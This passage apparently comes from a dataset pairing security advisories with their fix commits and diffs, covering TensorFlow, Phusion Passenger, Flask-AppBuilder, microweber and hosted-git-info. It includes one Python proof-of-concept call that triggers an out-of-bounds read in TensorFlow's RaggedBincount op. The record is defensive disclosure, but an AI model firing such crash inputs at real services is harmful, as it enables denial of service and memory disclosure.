`RaggedBinCount` ### Impact\nIf the `splits` argument of `RaggedBincount` does not specify a valid [`SparseTensor`](https:\/\/www.tensorflow.org\/api_docs\/python\/tf\/sparse\/SparseTensor), then an attacker can trigger a heap buffer overflow:\n\n```python\nimport tensorflow as tf\ntf.raw_ops.RaggedBincount(splits=[0], values=[1,1,1,1,1], size=5, weights=[1,2,3,4], binary_output=False)\n```\n\nThis will cause a read from outside the bounds of the `splits` tensor buffer in the [implementation of the `RaggedBincount` op](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8b677d79167799f71c42fd3fa074476e0295413a\/tensorflow\/core\/kernels\/bincount_op.cc#L430-L433):\n\n```cc\n    for (int idx = 0; idx < num_values; ++idx) {\n      while (idx >= splits(batch_idx)) {\n        batch_idx++;\n      }\n      ...\n    }\n```\n\nBefore the `for` loop, `batch_idx` is set to 0. The user controls the `splits` array, making it contain only one element, 0. Thus, the code in the `while` loop would increment `batch_idx` and then try to read `splits(1)`, which is outside of bounds.\n\n### Patches\nWe have patched the issue in GitHub commit [eebb96c2830d48597d055d247c0e9aebaea94cd5](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/eebb96c2830d48597d055d247c0e9aebaea94cd5).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2 and TensorFlow 2.3.3, as these are also affected.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/eebb96c2830d48597d055d247c0e9aebaea94cd5","commit_sha":"eebb96c2830d48597d055d247c0e9aebaea94cd5","patch":"SINGLE","chain_ord":"['eebb96c2830d48597d055d247c0e9aebaea94cd5']","before_first_fix_commit":"{'8b677d79167799f71c42fd3fa074476e0295413a'}","last_fix_commit":"eebb96c2830d48597d055d247c0e9aebaea94cd5","chain_ord_pos":1.0,"commit_datetime":"04\/13\/2021, 21:18:51","message":"Fix an invalid address vulnerability in `tf.raw_ops.RaggedBincount`.\n\nPiperOrigin-RevId: 368293153\nChange-Id: I4b4e493d3fd05e7dc55a55de3a041a80a4f275c3","author":"Amit Patankar","comments":"{'com_1': {'author': 'Rayyan335', 'datetime': '05\/14\/2021, 19:00:36', 'body': 'tensorflow\/core\/kernels\/bincount_op.cc'}}","stats":"{'additions': 9, 'deletions': 0, 'total': 9}","files":"{'tensorflow\/core\/kernels\/bincount_op.cc': {'additions': 9, 'deletions': 0, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/eebb96c2830d48597d055d247c0e9aebaea94cd5\/tensorflow%2Fcore%2Fkernels%2Fbincount_op.cc', 'patch': '@@ -420,6 +420,15 @@ class RaggedBincountOp : public OpKernel {\\n     int num_values = values.size();\\n     int batch_idx = 0;\\n \\n+    OP_REQUIRES(ctx, splits(0) == 0,\\n+                errors::InvalidArgument(\"Splits must start with 0, not with \",\\n+                                        splits(0)));\\n+\\n+    OP_REQUIRES(ctx, splits(num_rows) == num_values,\\n+                errors::InvalidArgument(\\n+                    \"Splits must end with the number of values, got \",\\n+                    splits(num_rows), \" instead of \", num_values));\\n+\\n     Tensor* out_t;\\n     OP_REQUIRES_OK(\\n         ctx, ctx->allocate_output(0, TensorShape({num_rows, size}), &out_t));'}}","message_norm":"fix an invalid address vulnerability in `tf.raw_ops.raggedbincount`.\n\npiperorigin-revid: 368293153\nchange-id: i4b4e493d3fd05e7dc55a55de3a041a80a4f275c3","language":"en","entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', ''), ('368293153', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/bincount_op.cc'])","num_files":1.0},{"index":334,"vuln_id":"GHSA-4284-jfhc-f854","cwe_id":"{'CWE-732'}","score":5.3,"chain":"{'https:\/\/github.com\/phusion\/passenger\/commit\/4e97fdb86d0a0141ec9a052c6e691fcd07bb45c8'}","dataset":"osv","summary":"Phusion Passenger incorrect permission assignment An issue was discovered in switchGroup() in agent\/ExecHelper\/ExecHelperMain.cpp in Phusion Passenger before 5.3.2. The set of groups (gidset) is not set correctly, leaving it up to randomness (i.e., uninitialized memory) which supplementary groups are actually being set while lowering privileges.","published_date":"2022-05-13","chain_len":1,"project":"https:\/\/github.com\/phusion\/passenger","commit_href":"https:\/\/github.com\/phusion\/passenger\/commit\/4e97fdb86d0a0141ec9a052c6e691fcd07bb45c8","commit_sha":"4e97fdb86d0a0141ec9a052c6e691fcd07bb45c8","patch":"SINGLE","chain_ord":"['4e97fdb86d0a0141ec9a052c6e691fcd07bb45c8']","before_first_fix_commit":"{'6120509d3dca78b959135529262047febe884498'}","last_fix_commit":"4e97fdb86d0a0141ec9a052c6e691fcd07bb45c8","chain_ord_pos":1.0,"commit_datetime":"05\/29\/2018, 13:33:50","message":"ExecHelperMain: fix privilege lowering code","author":"Hongli Lai (Phusion)","comments":"{'com_1': {'author': 'kbabioch', 'datetime': '06\/21\/2018, 14:31:00', 'body': 'CVE-2018-12615 has been assigned to this.'}, 'com_2': {'author': 'CamJN', 'datetime': '06\/21\/2018, 14:33:35', 'body': \"Where was this reported? Mitre isn't showing a listing for CVE-2018-12615.\"}, 'com_3': {'author': 'kbabioch', 'datetime': '06\/21\/2018, 14:37:46', 'body': \"It was reported through MITRE and will be displayed in the usual places, once it is synced, which usually takes a couple of hours. I've just added the comment as a reference, in case someone will be looking for it in the future.\"}, 'com_4': {'author': 'kbabioch', 'datetime': '06\/21\/2018, 14:39:14', 'body': 'By the way: While looking at the code we also realized that there might be other issues with the privilege drop, e.g. #2096'}}","stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'src\/agent\/ExecHelper\/ExecHelperMain.cpp': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/phusion\/passenger\/raw\/4e97fdb86d0a0141ec9a052c6e691fcd07bb45c8\/src%2Fagent%2FExecHelper%2FExecHelperMain.cpp', 'patch': '@@ -201,6 +201,9 @@ switchGroup(uid_t uid, const struct passwd *userInfo, gid_t gid) {\\n \\t\\t\\tif (ngroups <= NGROUPS_MAX) {\\n \\t\\t\\t\\tsetgroupsCalled = true;\\n \\t\\t\\t\\tgidset.reset(new gid_t[ngroups]);\\n+\\t\\t\\t\\tfor (int i = 0; i < ngroups; i++) {\\n+\\t\\t\\t\\t\\tgidset[i] = groups[i];\\n+\\t\\t\\t\\t}\\n \\t\\t\\t\\tif (setgroups(ngroups, gidset.get()) == -1) {\\n \\t\\t\\t\\t\\tint e = errno;\\n \\t\\t\\t\\t\\tfprintf(stderr, \"ERROR: setgroups(%d, ...) failed: %s (errno=%d)\\\\n\",'}}","message_norm":"exechelpermain: fix privilege lowering code","language":"en","entities":"[('fix', 'ACTION', ''), ('privilege', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/agent\/ExecHelper\/ExecHelperMain.cpp'])","num_files":1.0},{"index":336,"vuln_id":"GHSA-428x-9xc2-m8mj","cwe_id":"{'CWE-369'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e5b0eec199c2d03de54fd6a7fd9275692218e2bc'}","dataset":"osv","summary":"Division by zero in TFLite ### Impact \nAn attacker can craft a TFLite model that would trigger a division by zero in [the implementation of depthwise convolutions](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/lite\/kernels\/depthwise_conv.cc#L96).\n\nThe parameters of the convolution can be user controlled and are also used within a division operation to determine the size of the padding that needs to be added before applying the convolution. There is no check before this division that the divisor is stricly positive.\n\n### Patches              \nWe have patched the issue in GitHub commit [e5b0eec199c2d03de54fd6a7fd9275692218e2bc](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e5b0eec199c2d03de54fd6a7fd9275692218e2bc).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e5b0eec199c2d03de54fd6a7fd9275692218e2bc","commit_sha":"e5b0eec199c2d03de54fd6a7fd9275692218e2bc","patch":"SINGLE","chain_ord":"['e5b0eec199c2d03de54fd6a7fd9275692218e2bc']","before_first_fix_commit":"{'ece78f4001dd87f50daab1d1b43f70a51726b8fb'}","last_fix_commit":"e5b0eec199c2d03de54fd6a7fd9275692218e2bc","chain_ord_pos":1.0,"commit_datetime":"12\/15\/2021, 01:04:19","message":"[lite] Add validation check for dilation height\/width to be positive integers.\n\nPiperOrigin-RevId: 416429178\nChange-Id: If7cdcddca54486434d9b2f06e7e2b401d7c3ee25","author":"Karim Nosir","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/lite\/kernels\/depthwise_conv.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e5b0eec199c2d03de54fd6a7fd9275692218e2bc\/tensorflow%2Flite%2Fkernels%2Fdepthwise_conv.cc', 'patch': '@@ -115,6 +115,8 @@ TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) {\\n \\n   TF_LITE_ENSURE_EQ(context, NumDimensions(input), 4);\\n   TF_LITE_ENSURE_EQ(context, NumDimensions(filter), 4);\\n+  TF_LITE_ENSURE(context, params->dilation_height_factor > 0);\\n+  TF_LITE_ENSURE(context, params->dilation_width_factor > 0);\\n \\n   const TfLiteType data_type = input->type;'}}","message_norm":"[lite] add validation check for dilation height\/width to be positive integers.\n\npiperorigin-revid: 416429178\nchange-id: if7cdcddca54486434d9b2f06e7e2b401d7c3ee25","language":"en","entities":"[('add', 'ACTION', ''), ('416429178', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/depthwise_conv.cc'])","num_files":1.0},{"index":339,"vuln_id":"GHSA-434h-p4gx-jm89","cwe_id":"{'CWE-203'}","score":5.3,"chain":"{'https:\/\/github.com\/dpgaspar\/Flask-AppBuilder\/commit\/780bd0e8fbf2d36ada52edb769477e0a4edae580'}","dataset":"osv","summary":"Observable Response Discrepancy in Flask-AppBuilder ### Impact\nUser enumeration in database authentication in Flask-AppBuilder <= 3.2.3. Allows for a non authenticated user to enumerate existing accounts by timing the response time from the server when you are logging in.\n\n### Patches\nUpgrade to 3.3.0\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Flask-AppBuilder](https:\/\/github.com\/dpgaspar\/Flask-AppBuilder)","published_date":"2021-05-27","chain_len":1,"project":"https:\/\/github.com\/dpgaspar\/Flask-AppBuilder","commit_href":"https:\/\/github.com\/dpgaspar\/Flask-AppBuilder\/commit\/780bd0e8fbf2d36ada52edb769477e0a4edae580","commit_sha":"780bd0e8fbf2d36ada52edb769477e0a4edae580","patch":"SINGLE","chain_ord":"['780bd0e8fbf2d36ada52edb769477e0a4edae580']","before_first_fix_commit":"{'b60dea9cedf98b56c926ba41020c73f287d5826e'}","last_fix_commit":"780bd0e8fbf2d36ada52edb769477e0a4edae580","chain_ord_pos":1.0,"commit_datetime":"05\/10\/2021, 08:37:55","message":"fix: auth balance (#1634)","author":"Daniel Vaz Gaspar","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'flask_appbuilder\/security\/manager.py': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/dpgaspar\/Flask-AppBuilder\/raw\/780bd0e8fbf2d36ada52edb769477e0a4edae580\/flask_appbuilder%2Fsecurity%2Fmanager.py', 'patch': '@@ -833,6 +833,12 @@ def auth_user_db(self, username, password):\\n         if user is None:\\n             user = self.find_user(email=username)\\n         if user is None or (not user.is_active):\\n+            # Balance failure and success\\n+            check_password_hash(\\n+                \"pbkdf2:sha256:150000$Z3t6fmj2$22da622d94a1f8118\"\\n+                \"c0976a03d2f18f680bfff877c9a965db9eedc51bc0be87c\",\\n+                \"password\",\\n+            )\\n             log.info(LOGMSG_WAR_SEC_LOGIN_FAILED.format(username))\\n             return None\\n         elif check_password_hash(user.password, password):'}}","message_norm":"fix: auth balance (#1634)","language":"en","entities":"[('auth', 'SECWORD', ''), ('#1634', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['flask_appbuilder\/security\/manager.py'])","num_files":1.0},{"index":341,"vuln_id":"GHSA-437j-5qc3-c589","cwe_id":"{'CWE-601'}","score":6.1,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/187e949daf7dea6f10b80da70988f0f86444eeff'}","dataset":"osv","summary":"Open Redirect in microweber Open Redirect in GitHub repository microweber\/microweber prior to 1.2.19.","published_date":"2022-06-30","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/187e949daf7dea6f10b80da70988f0f86444eeff","commit_sha":"187e949daf7dea6f10b80da70988f0f86444eeff","patch":"SINGLE","chain_ord":"['187e949daf7dea6f10b80da70988f0f86444eeff']","before_first_fix_commit":"{'e6361e9fdcaaf2b27fb664beaa2fb33d46e3542e'}","last_fix_commit":"187e949daf7dea6f10b80da70988f0f86444eeff","chain_ord_pos":1.0,"commit_datetime":"06\/29\/2022, 15:14:26","message":"update","author":"Peter Ivanov","comments":null,"stats":"{'additions': 8, 'deletions': 0, 'total': 8}","files":"{'src\/MicroweberPackages\/Helper\/UrlManager.php': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/187e949daf7dea6f10b80da70988f0f86444eeff\/src%2FMicroweberPackages%2FHelper%2FUrlManager.php', 'patch': \"@@ -105,7 +105,15 @@ public function redirect($url)\\n \\n         $redirectUrl = site_url();\\n         $parseUrl = parse_url($url);\\n+\\n         if (isset($parseUrl['host'])) {\\n+            if(isset($parseUrl['user']) and $parseUrl['user']){\\n+                return \\\\Redirect::to(site_url());\\n+            }\\n+\\n+            if(isset($parseUrl['pass']) and $parseUrl['pass']){\\n+                return \\\\Redirect::to(site_url());\\n+            }\\n             if ($parseUrl['host'] == site_hostname()) {\\n                 $redirectUrl = $url;\\n             }\"}}","message_norm":"update","language":"ro","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/Helper\/UrlManager.php'])","num_files":1.0},{"index":343,"vuln_id":"GHSA-43f8-2h32-f4cj","cwe_id":"{'CWE-400'}","score":5.3,"chain":"{'https:\/\/github.com\/npm\/hosted-git-info\/commit\/bede0dc38e1785e732bf0a48ba6f81a4a908eba3', 'https:\/\/github.com\/npm\/hosted-git-info\/commit\/8d4b3697d79bcd89cdb36d1db165e3696c783a01', 'https:\/\/github.com\/npm\/hosted-git-info\/commit\/29adfe5ef789784c861b2cdeb15051ec2ba651a7'}","dataset":"osv","summary":"Regular Expression Denial of Service in hosted-git-info The npm package `hosted-git-info` before 3.0.8 are vulnerable to Regular Expression Denial of Service (ReDoS) via regular expression shortcutMatch in the fromUrl function in index.js. The affected regular expression exhibits polynomial worst-case time complexity","published_date":"2021-05-06","chain_len":3,"project":"https:\/\/github.com\/npm\/hosted-git-info","commit_href":"https:\/\/github.com\/npm\/hosted-git-info\/commit\/bede0dc38e1785e732bf0a48ba6f81a4a908eba3","commit_sha":"bede0dc38e1785e732bf0a48ba6f81a4a908eba3","patch":"MULTI","chain_ord":"['bede0dc38e1785e732bf0a48ba6f81a4a908eba3', '29adfe5ef789784c861b2cdeb15051ec2ba651a7', '8d4b3697d79bcd89cdb36d1db165e3696c783a01']","before_first_fix_commit":"{'29adfe5ef789784c861b2cdeb15051ec2ba651a7'}","last_fix_commit":"8d4b3697d79bcd89cdb36d1db165e3696c783a01","chain_ord_pos":1.0,"commit_datetime":"01\/28\/2021, 17:22:16","message":"fix: simplify the regular expression for shortcut matching\n\nPR-URL: https:\/\/github.com\/npm\/hosted-git-info\/pull\/76\nCredit: @nlf\nClose: #76\nReviewed-by: @isaacs","author":"nlf","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'index.js': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/npm\/hosted-git-info\/raw\/bede0dc38e1785e732bf0a48ba6f81a4a908eba3\/index.js', 'patch': \"@@ -41,7 +41,7 @@ function fromUrl (giturl, opts) {\\n     isGitHubShorthand(giturl) ? 'github:' + giturl : giturl\\n   )\\n   var parsed = parseGitUrl(url)\\n-  var shortcutMatch = url.match(new RegExp('^([^:]+):(?:(?:[^@:]+(?:[^@]+)?@)?([^\/]*))[\/](.+?)(?:[.]git)?($|#)'))\\n+  var shortcutMatch = url.match(\/^([^:]+):(?:[^@]+@)?(?:([^\/]*)\\\\\/)?([^#]+)\/)\\n   var matches = Object.keys(gitHosts).map(function (gitHostName) {\\n     try {\\n       var gitHostInfo = gitHosts[gitHostName]\\n@@ -55,7 +55,7 @@ function fromUrl (giturl, opts) {\\n       var defaultRepresentation = null\\n       if (shortcutMatch && shortcutMatch[1] === gitHostName) {\\n         user = shortcutMatch[2] && decodeURIComponent(shortcutMatch[2])\\n-        project = decodeURIComponent(shortcutMatch[3])\\n+        project = decodeURIComponent(shortcutMatch[3].replace(\/\\\\.git$\/, ''))\\n         defaultRepresentation = 'shortcut'\\n       } else {\\n         if (parsed.host && parsed.host !== gitHostInfo.domain && parsed.host.replace(\/^www[.]\/, '') !== gitHostInfo.domain) return\"}}","message_norm":"fix: simplify the regular expression for shortcut matching\n\npr-url: https:\/\/github.com\/npm\/hosted-git-info\/pull\/76\ncredit: @nlf\nclose: #76\nreviewed-by: @isaacs","language":"en","entities":"[('https:\/\/github.com\/npm\/hosted-git-info\/pull\/76', 'URL', ''), ('#76', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":345,"vuln_id":"GHSA-43f8-2h32-f4cj","cwe_id":"{'CWE-400'}","score":5.3,"chain":"{'https:\/\/github.com\/npm\/hosted-git-info\/commit\/bede0dc38e1785e732bf0a48ba6f81a4a908eba3', 'https:\/\/github.com\/npm\/hosted-git-info\/commit\/8d4b3697d79bcd89cdb36d1db165e3696c783a01', 'https:\/\/github.com\/npm\/hosted-git-info\/commit\/29adfe5ef789784c861b2cdeb15051ec2ba651a7'}","dataset":"osv","summary":"Regular Expression Denial of Service in hosted-git-info The npm package `hosted-git-info` before 3.0.8 are vulnerable to Regular Expression Denial of Service (ReDoS) via regular expression shortcutMatch in the fromUrl function in index.js. The affected regular expression exhibits polynomial worst-case time complexity","published_date":"2021-05-06","chain_len":3,"project":"https:\/\/github.com\/npm\/hosted-git-info","commit_href":"https:\/\/github.com\/npm\/hosted-git-info\/commit\/29adfe5ef789784c861b2cdeb15051ec2ba651a7","commit_sha":"29adfe5ef789784c861b2cdeb15051ec2ba651a7","patch":"MULTI","chain_ord":"['bede0dc38e1785e732bf0a48ba6f81a4a908eba3', '29adfe5ef789784c861b2cdeb15051ec2ba651a7', '8d4b3697d79bcd89cdb36d1db165e3696c783a01']","before_first_fix_commit":"{'29adfe5ef789784c861b2cdeb15051ec2ba651a7'}","last_fix_commit":"8d4b3697d79bcd89cdb36d1db165e3696c783a01","chain_ord_pos":2.0,"commit_datetime":"04\/07\/2021, 19:31:52","message":"fix: backport regex fix from #76\n\nPR-URL: https:\/\/github.com\/npm\/hosted-git-info\/pull\/84\nCredit: @nlf\nClose: #84\nReviewed-by: @wraithgar","author":"nlf","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'index.js': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/npm\/hosted-git-info\/raw\/29adfe5ef789784c861b2cdeb15051ec2ba651a7\/index.js', 'patch': \"@@ -41,7 +41,7 @@ function fromUrl (giturl, opts) {\\n     isGitHubShorthand(giturl) ? 'github:' + giturl : giturl\\n   )\\n   var parsed = parseGitUrl(url)\\n-  var shortcutMatch = url.match(new RegExp('^([^:]+):(?:(?:[^@:]+(?:[^@]+)?@)?([^\/]*))[\/](.+?)(?:[.]git)?($|#)'))\\n+  var shortcutMatch = url.match(\/^([^:]+):(?:[^@]+@)?(?:([^\/]*)\\\\\/)?([^#]+)\/)\\n   var matches = Object.keys(gitHosts).map(function (gitHostName) {\\n     try {\\n       var gitHostInfo = gitHosts[gitHostName]\\n@@ -55,7 +55,7 @@ function fromUrl (giturl, opts) {\\n       var defaultRepresentation = null\\n       if (shortcutMatch && shortcutMatch[1] === gitHostName) {\\n         user = shortcutMatch[2] && decodeURIComponent(shortcutMatch[2])\\n-        project = decodeURIComponent(shortcutMatch[3])\\n+        project = decodeURIComponent(shortcutMatch[3].replace(\/\\\\.git$\/, ''))\\n         defaultRepresentation = 'shortcut'\\n       } else {\\n         if (parsed.host && parsed.host !== gitHostInfo.domain && parsed.host.replace(\/^www[.]\/, '') !== gitHostInfo.domain) return\"}}","message_norm":"fix: backport regex fix from #76\n\npr-url: https:\/\/github.com\/npm\/hosted-git-info\/pull\/84\ncredit: @nlf\nclose: #84\nreviewed-by: @wraithgar","language":"en","entities":"[('#76', 'ISSUE', ''), ('https:\/\/github.com\/npm\/hosted-git-info\/pull\/84', 'URL', ''), ('#84', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":347,"vuln_id":"GHSA-43jf-985q-588j","cwe_id":"{'CWE-617'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3d89911481ba6ebe8c88c1c0b595412121e6c645'}","dataset":"osv","summary":"Multiple `CHECK`-fails in `function.cc` in TensowFlow ### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [assertions in `function.cc`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/framework\/function.cc) would be falsified and crash the Python interpreter.\n### Patches\nWe have patched the issue in GitHub commits [dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2) and [3d89911481ba6ebe8c88c1c0b595412121e6c645](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3d89911481ba6ebe8c88c1c0b595412121e6c645).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2","commit_sha":"dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2","patch":"MULTI","chain_ord":"['3d89911481ba6ebe8c88c1c0b595412121e6c645', 'dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2']","before_first_fix_commit":"{'955059813cc325dc1db5e2daa6221271406d4439'}","last_fix_commit":"dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2","chain_ord_pos":2.0,"commit_datetime":"11\/12\/2021, 16:19:38","message":"Eliminate debug `CHECK`-fail from `function.cc`\n\nPiperOrigin-RevId: 409416119\nChange-Id: I8376ee464d434e9b970ff0ad49edfdaa2a273cfe","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 5, 'deletions': 1, 'total': 6}","files":"{'tensorflow\/core\/framework\/function.cc': {'additions': 5, 'deletions': 1, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2\/tensorflow%2Fcore%2Fframework%2Ffunction.cc', 'patch': '@@ -191,7 +191,11 @@ class FunctionInstantiationHelper {\\n     for (size_t i = 0; i < dtypes.size(); ++i) {\\n       TF_RETURN_IF_ERROR(AddItem(strings::StrCat(arg_def.name(), \":\", i),\\n                                  {true, arg_index, 0, false, {dtypes[i]}}));\\n-      DCHECK_EQ(arg_index, result_.nodes.size());\\n+      if (arg_index != result_.nodes.size()) {\\n+        return errors::Internal(\\n+            \"Expected arg_index to be equal to the number of nodes in result.\",\\n+            \" Got \", arg_index, \" and \", result_.nodes.size());\\n+      }\\n       string name = arg_def.name();\\n       if (dtypes.size() > 1) {\\n         strings::StrAppend(&name, \"_\", i);'}}","message_norm":"eliminate debug `check`-fail from `function.cc`\n\npiperorigin-revid: 409416119\nchange-id: i8376ee464d434e9b970ff0ad49edfdaa2a273cfe","language":"en","entities":"[('409416119', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/framework\/function.cc'])","num_files":1.0},{"index":348,"vuln_id":"GHSA-43jf-985q-588j","cwe_id":"{'CWE-617'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3d89911481ba6ebe8c88c1c0b595412121e6c645'}","dataset":"osv","summary":"Multiple `CHECK`-fails in `function.cc` in TensowFlow ### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [assertions in `function.cc`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/framework\/function.cc) would be falsified and crash the Python interpreter.\n### Patches\nWe have patched the issue in GitHub commits [dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2) and [3d89911481ba6ebe8c88c1c0b595412121e6c645](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3d89911481ba6ebe8c88c1c0b595412121e6c645).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3d89911481ba6ebe8c88c1c0b595412121e6c645","commit_sha":"3d89911481ba6ebe8c88c1c0b595412121e6c645","patch":"MULTI","chain_ord":"['3d89911481ba6ebe8c88c1c0b595412121e6c645', 'dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2']","before_first_fix_commit":"{'955059813cc325dc1db5e2daa6221271406d4439'}","last_fix_commit":"dcc21c7bc972b10b6fb95c2fb0f4ab5a59680ec2","chain_ord_pos":1.0,"commit_datetime":"11\/12\/2021, 16:12:05","message":"Eliminate `CHECK`-fail from `function.cc`.\n\nPiperOrigin-RevId: 409414744\nChange-Id: Ic854e12ab2edb88b165d32e2d632c4ee654d71ad","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 1, 'total': 4}","files":"{'tensorflow\/core\/framework\/function.cc': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/3d89911481ba6ebe8c88c1c0b595412121e6c645\/tensorflow%2Fcore%2Fframework%2Ffunction.cc', 'patch': '@@ -181,7 +181,9 @@ class FunctionInstantiationHelper {\\n     DataTypeVector dtypes;\\n     TF_RETURN_IF_ERROR(\\n         ArgNumType(attr_values, arg_def, &is_type_list, &dtypes));\\n-    CHECK_GE(dtypes.size(), size_t{1});\\n+    if (dtypes.size() < size_t{1}) {\\n+      return errors::Internal(\"Expected a list of at least one dtype\");\\n+    }\\n     int arg_index = result_.nodes.size();\\n     TF_RETURN_IF_ERROR(\\n         AddItem(arg_def.name(), {true, arg_index, 0, is_type_list, dtypes}));'}}","message_norm":"eliminate `check`-fail from `function.cc`.\n\npiperorigin-revid: 409414744\nchange-id: ic854e12ab2edb88b165d32e2d632c4ee654d71ad","language":"it","entities":"[('409414744', 'SHA', 